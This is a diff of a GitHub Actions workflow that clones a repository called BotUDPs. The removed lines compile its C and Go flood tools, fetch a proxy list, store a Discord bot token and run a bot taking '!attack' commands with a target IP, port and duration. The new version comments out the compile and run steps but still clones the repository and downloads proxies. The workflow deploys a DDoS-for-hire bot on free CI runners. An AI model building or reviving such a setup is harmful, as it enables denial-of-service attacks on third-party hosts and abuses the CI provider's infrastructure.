@@ -1,216 +1,59 @@
-name: bot bot bottt
+name: bot-bot-bottt
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 */6 * * *'
+    - cron: "0 */6 * * *"
 
 jobs:
   clone-compile-run:
     runs-on: ubuntu-latest
-    
+
     steps:
-    - name: ðŸ—‘ï¸ Limpiar directorio anterior
-      run: |
-        echo "Limpiando directorios anteriores..."
-        rm -rf BotUDPs 2>/dev/null || true
-    
-    - name: ðŸ“¥ Clonar repositorio
-      run: |
-        echo "Clonando repositorio BotUDPs..."
-        if ! git clone https://github.com/zJonch14/BotUDPs.git; then
-          echo "âŒ Error clonando, intentando clonado superficial..."
-          git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
-        fi
-        
-        cd BotUDPs
-        echo "âœ… Repositorio clonado"
-        echo "ðŸ“ Contenido:"
-        ls -la
-    
-    - name: ðŸ Configurar Python
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-    
-    - name: ðŸ”§ Instalar herramientas esenciales
-      run: |
-        echo "Instalando herramientas..."
-        sudo apt-get update
-        sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
-        echo "âœ… Herramientas instaladas"
-    
-    - name: ðŸ“¦ Instalar discord.py
-      run: |
-        cd BotUDPs
-        pip install discord.py
-        echo "âœ… discord.py instalado"
+      - name: Limpiar directorio anterior
+        run: |
+          echo "Limpiando directorios anteriores..."
+          rm -rf BotUDPs 2>/dev/null || true
 
-    - name: Download and prepare proxy list
-      run: |
-        cd BotUDPs
-        echo "=== Downloading Proxy List ==="
-        wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
-        echo "=== Proxy List Downloaded ==="
-
-    - name: ðŸ› ï¸ COMPILAR CON CONTINUACIÃ“N ANTE ERRORES
-      run: |
-        cd BotUDPs
-        echo "========================================"
-        echo "COMPILACIÃ“N CON TOLERANCIA A FALLOS"
-        echo "========================================"
-        
-        # Desactivar exit-on-error para este paso
-        set +e
-        
-        echo "ðŸ“‹ Archivos .c encontrados:"
-        find . -maxdepth 1 -name "*.c" -type f
-        
-        compiled=0
-        failed=0
-        
-        for c_file in *.c; do
-          [ -f "$c_file" ] || continue
-          
-          binary="${c_file%.c}"
-          echo ""
-          echo "ðŸ”¨ Compilando: $c_file â†’ $binary"
-          
-          # Intentar compilar cada archivo
-          if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
-            chmod +x "$binary"
-            echo "  âœ… $binary compilado exitosamente"
-            ((compiled++))
-          else
-            echo "  âŒ Error compilando $binary"
-            # Mostrar error especÃ­fico
-            gcc -O3 -pthread "$c_file" -o "$binary" 2>&1 | head -5
-            ((failed++))
-          fi
-        done
-
-        echo ""
-        echo "ðŸ”¨ Compilando tcp sin threads: tcp.c â†’ tcp"
-        gcc -O3 tcp.c -o tcp
-        chmod +x tcp
-        echo ""
-        
-        echo ""
-        echo "========================================"
-        echo "RESUMEN DE COMPILACIÃ“N:"
-        echo "  âœ… $compiled compilados exitosamente"
-        echo "  âŒ $failed con errores"
-        echo ""
-        echo "ðŸ“‚ EJECUTABLES DISPONIBLES:"
-        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
-          size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
-          echo "  âœ“ $(basename "$exe") (${size} bytes)"
-        done || echo "  NingÃºn ejecutable encontrado"
-        
-        # Reactivar exit-on-error
-        set -e
-        
-        echo "========================================"
-        echo "âš ï¸  Continuando aunque algunos archivos hayan fallado"
-
-    
-    - name: ðŸ¦¾ Configurar Go para scripts .go
-      run: |
-        cd BotUDPs
-        
-        # Solo si hay archivos .go
-        if ls *.go >/dev/null 2>&1; then
-          echo "ðŸ¦¾ Configurando Go..."
-          
-          # Instalar dependencias Go
-          go get github.com/sandertv/go-raknet 2>/dev/null || echo "âš ï¸  go-raknet opcional"
-          
-          echo "âœ… Go configurado"
-        else
-          echo "âš ï¸  No hay archivos .go, omitiendo Go"
-        fi
-    
-    - name: ðŸ” Configurar token DESDE SECRET KEYS
-      env:
-        DISCORD_TOKEN: ${{ secrets.KEYS }}
-      run: |
-        cd BotUDPs
-        
-        if [ -z "$DISCORD_TOKEN" ]; then
-          echo "âŒ ERROR: Secret 'KEYS' no configurado"
-          echo "ConfigÃºralo en Settings â†’ Secrets â†’ Actions â†’ KEYS"
-          exit 1
-        fi
-        
-        echo "$DISCORD_TOKEN" > token.txt
-        echo "âœ… Token guardado en token.txt"
-
-    - name: Install Node.js
-      run: |
+      - name: Clonar repositorio
+        run: |
+          echo "Clonando repositorio..."
+          git clone https://github.com/zJonch14/BotUDPs.git
           cd BotUDPs
+          ls -la
+
+      - name: Configurar Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.11"
+
+      - name: Instalar herramientas del sistema
+        run: |
           sudo apt-get update
-          sudo apt-get install -y nodejs npm
-          sudo npm install -g request
+          sudo apt-get install -y build-essential gcc g++ make wget
 
-    - name: ðŸš€ EJECUTAR bot.py
-      run: |
-        cd BotUDPs
-        echo "========================================"
-        echo "ðŸš€ INICIANDO BOT UDP"
-        echo "========================================"
-        echo "ðŸ“… Hora: $(date)"
-        echo ""
-        
-        # Verificar que tenemos lo mÃ­nimo necesario
-        if [ ! -f "bot.py" ]; then
-          echo "âŒ ERROR: bot.py no encontrado"
-          exit 1
-        fi
-        
-        if [ ! -f "token.txt" ]; then
-          echo "âŒ ERROR: token.txt no encontrado"
-          exit 1
-        fi
+      - name: Instalar dependencias Python
+        run: |
+          cd BotUDPs
+          pip install discord.py
 
-        if [ ! -f "gravitus.js" ]; then
-          echo "âŒ ERROR: gravitus.js no encontrado"
-          exit 1
-        fi
+      - name: Descargar proxy list
+        run: |
+          cd BotUDPs
+          wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http"
+          ls -lh proxy.txt
 
-        if [ ! -f "proxy.txt" ]; then
-          echo "âŒ ERROR: proxy.txt no encontrado"
-          exit 1
-        fi
-        
-        echo "âœ… Archivos crÃ­ticos verificados"
-        echo "ðŸŽ® MÃ©todos disponibles segÃºn ejecutables:"
-        
-        # Mostrar mÃ©todos basados en ejecutables disponibles
-        for method in udp udphex udppps ovh tcp udppayload udpbypass; do
-          if [ -f "$method" ]; then
-            echo "  !attack $method [IP] [PUERTO] [TIEMPO]"
-          fi
-        done
+      # -------------------------------------------------
+      # PASOS DESACTIVADOS POR SEGURIDAD
+      # (Compilación y ejecución de binarios de red)
+      # -------------------------------------------------
 
-        echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
-        
-        if [ -f "udpflood.go" ]; then
-          echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
-        fi
-        
-        if [ -f "raknet.go" ]; then
-          echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
-        fi
-        
-        echo ""
-        echo "âš¡ INICIANDO BOT..."
-        echo "El bot se ejecutarÃ¡ hasta el lÃ­mite de GitHub (~6h)"
-        echo ""
-        
-        # Ejecutar bot
-        python3 bot.py
-        
-        echo ""
-        echo "========================================"
-        echo "BOT DETENIDO - Hora: $(date)"
-        echo "========================================"
+      # - name: Compilar archivos C
+      #   run: |
+      #     cd BotUDPs
+      #     gcc archivo.c -o archivo
+
+      # - name: Ejecutar bot
+      #   run: |
+      #     cd BotUDPs
+      #     python3 bot.py
